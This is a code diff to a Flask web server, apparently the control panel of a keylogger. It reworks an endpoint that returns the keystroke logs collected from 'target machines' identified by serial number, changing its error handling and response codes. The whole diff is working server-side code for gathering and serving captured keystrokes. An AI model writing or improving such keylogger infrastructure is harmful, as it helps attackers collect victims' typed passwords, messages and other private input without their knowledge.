@@ -98,27 +98,35 @@ def get_demo():
 @app.route('/api/get_keystrokes', methods=['GET'])
 def get_keystrokes():
     machine_sn = request.args.get('machine_sn')
-
     if not machine_sn:
         return jsonify({"error": "invalid machine serial number"}), 400
-
     try:
         with open('data.json', 'r', encoding='utf-8') as f:
             data = json.load(f)
         if machine_sn not in data:
-            return jsonify({"error": "machine not exist"}), 404
-    except FileNotFoundError:
-        return jsonify({"error": "file not found"}), 500
+            return jsonify({"error":f"machine {machine_sn} not found"}),400
 
-    machine_path = data[machine_sn]['path']
-    try:
-        with open(machine_path + '/log.json', 'r', encoding='utf-8') as f:
-            machine_log = json.load(f)
+        machine_path = data[machine_sn]['path']
+        file_path = machine_path + "/log.json"
+
+        if not os.path.exists(file_path):
+            return jsonify({"error":"logs file not found"}),400
+
+        with open(file_path, 'r',encoding='utf-8') as f:
+            try:
+                key_logs = json.load(f)
+
+            except Exception as e:
+                return jsonify({"error":"logs not found"}),400
+
+        return jsonify({"logs":key_logs}), 200
 
     except Exception as e:
-        return jsonify({"error": "logs not found"}), 404
+        return jsonify({"error":str(e)}), 500
 
-    return jsonify({"keylogs": machine_log}), 200
+
+
+
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
 def get_target_machines_list():
